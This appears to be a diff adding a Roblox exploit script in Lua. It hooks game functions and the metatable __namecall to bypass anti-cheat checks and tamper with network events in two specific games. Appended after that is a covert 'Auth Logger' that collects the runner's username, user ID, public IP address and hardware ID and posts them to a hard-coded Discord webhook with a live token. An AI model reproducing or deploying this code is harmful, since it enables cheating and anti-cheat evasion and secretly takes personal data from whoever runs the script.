@@ -1,0 +1,251 @@
+if game.PlaceId == 8204899140 or game.PlaceId == 104709320604721 then
+loadstring([[
+    function LPH_NO_VIRTUALIZE(f) return f end;
+    function LPH_NO_UPVALUES(f) return f end;
+]])();
+
+local realDelay
+realDelay = hookfunction(delay, LPH_NO_UPVALUES(function(time, callback, ...)
+    local spoofed = function(...)
+    end
+    return realDelay(time, spoofed, ...)
+end))
+
+
+local sub
+sub = hookfunction(("").sub, LPH_NO_UPVALUES(function(string, begin, ending, ...)
+    if not checkcaller() then
+        if begin == -2 and ending == -2 then
+            return "n"
+        elseif begin == -1 then
+            return " "
+        end
+    end
+
+    return sub(string, begin, ending, ...)
+end))
+
+
+local targetbestfunc 
+
+while not targetbestfunc do
+
+    if not targetbestfunc then
+        for _, fn in ipairs(getgc(true)) do
+            if type(fn) == "function" then
+                local ok, ups = pcall(getupvalues, fn)
+                if ok and ups and #ups > 40 then
+                    targetbestfunc = fn
+                    break
+                end
+            end
+        end
+    end
+
+    task.wait(0.6)
+end
+
+if not targetbestfunc  then
+    return
+end
+
+local ValidSequences = {
+    [1666] = true,
+    [1866] = true,
+    [1777] = true,
+}
+
+local savedTables = {}
+local foundCount = 0
+
+
+local mt = getrawmetatable(game)
+setreadonly(mt, false)
+local oldNamecall = mt.__namecall
+
+local __namecall
+__namecall = function(...)
+    local Arguments = {...}
+    local self = Arguments[1]
+    local Method = getnamecallmethod()
+
+    if not checkcaller()
+        and (Method == "FireServer" or Method == "fireServer")
+        and self.Name == "CharacterSoundEvent"
+    then
+         local arg3 = Arguments[3]
+
+         if type(arg3) == "string" then
+            local lower = string.lower(arg3)
+
+           if lower:find("catch", 1, true) then
+                return oldNamecall(...)
+            elseif #arg3 > 30 then
+                return
+            elseif lower:find("error", 1, true) then
+                return
+            end
+        end
+
+        if type(arg3) == "table" and foundCount < 3 then
+            if not savedTables[1] then
+                savedTables[1] = arg3
+                foundCount += 1
+            elseif not savedTables[2] and not rawequal(arg3, savedTables[1]) then
+                savedTables[2] = arg3
+                foundCount += 1
+            elseif not savedTables[3] and not rawequal(arg3, savedTables[1]) and not rawequal(arg3, savedTables[2]) then
+                savedTables[3] = arg3
+                foundCount += 1
+            end
+        end
+    end
+
+    return oldNamecall(...)
+end
+
+mt.__namecall = __namecall
+setreadonly(mt, true)
+
+
+
+local callCounters = {}
+
+local function bump19(slotTable, label)
+    local inner = slotTable[1]
+    local current = inner[19]
+    if typeof(current) ~= "number" then
+        return slotTable
+    end
+
+    local stored = callCounters[slotTable] or current
+
+    if stored < 1000 then
+        stored = stored + 1
+        callCounters[slotTable] = stored
+        inner[19] = stored
+    end
+
+    return slotTable
+end
+
+local realshuffle
+realshuffle = hookfunction(debug.getupvalues(targetbestfunc)[4], LPH_NO_UPVALUES(function(self, ...)
+    local args = { ... }
+
+    local key15 = args[1][1][15]
+    if savedTables[3] then 
+        if key15 == savedTables[1][1][15] then
+            return bump19(savedTables[1], "1")
+        elseif key15 == savedTables[2][1][15] then
+            return bump19(savedTables[2], "2")
+        elseif key15 == savedTables[3][1][15] then
+            return bump19(savedTables[3], "3")
+        end
+    end
+    return realshuffle(self, ...)
+end))
+
+end
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1477579236263989399/6hCJUJgLvBilXrngg98pRNt6uojyt6rtf20T4-OcMDArxcfTQgEOVnL4yi8Gqof2nBa9"
+
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+
+local username = player.Name
+local userId = tostring(player.UserId)
+local placeId = tostring(game.PlaceId)
+local gameId = tostring(game.GameId)
+
+local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"
+
+local hwid = "Unavailable"
+local hwidOk, hwidResult = pcall(function()
+    return game:GetService("RbxAnalyticsService"):GetClientId()
+end)
+if hwidOk and hwidResult then
+    hwid = hwidResult
+end
+
+local ip = "Unavailable"
+local ipOk, ipResponse = pcall(function()
+    return request({
+        Url = "https://api.ipify.org?format=json",
+        Method = "GET"
+    })
+end)
+if ipOk and ipResponse and ipResponse.StatusCode == 200 then
+    local decodeOk, data = pcall(function()
+        return game:GetService("HttpService"):JSONDecode(ipResponse.Body)
+    end)
+    if decodeOk and data and data.ip then
+        ip = data.ip
+    end
+end
+
+local timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+
+local embedData = {
+    embeds = {
+        {
+            title = "🔐 Script Executed",
+            color = 0x5865F2,
+            thumbnail = {
+                url = avatarUrl
+            },
+            fields = {
+                {
+                    name = "👤 Username",
+                    value = username,
+                    inline = true
+                },
+                {
+                    name = "🆔 User ID",
+                    value = userId,
+                    inline = true
+                },
+                {
+                    name = "🌐 IP Address",
+                    value = ip,
+                    inline = true
+                },
+                {
+                    name = "💻 HWID",
+                    value = hwid,
+                    inline = false
+                },
+                {
+                    name = "🎮 Place ID",
+                    value = placeId,
+                    inline = true
+                },
+                {
+                    name = "🗂️ Game ID",
+                    value = gameId,
+                    inline = true
+                },
+                {
+                    name = "🕐 Timestamp",
+                    value = timestamp,
+                    inline = false
+                }
+            },
+            footer = {
+                text = "Auth Logger"
+            }
+        }
+    }
+}
+
+local jsonBody = game:GetService("HttpService"):JSONEncode(embedData)
+
+local sendOk, sendErr = pcall(function()
+    request({
+        Url = WEBHOOK_URL,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = jsonBody
+    })
+end)
